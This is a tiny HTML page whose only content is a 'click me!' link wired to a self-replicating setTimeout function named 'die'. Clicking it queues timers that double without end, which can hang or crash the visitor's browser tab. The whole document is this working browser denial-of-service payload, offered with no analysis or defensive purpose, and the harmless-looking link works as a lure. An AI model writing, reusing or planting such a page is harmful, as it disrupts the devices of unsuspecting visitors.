<html>
<body>
<a href="#" onclick="die()">click me!</a>
<script>
function die () {
  setTimeout(function () {die(); die()}, 0)
}
</script>
</body>
</html>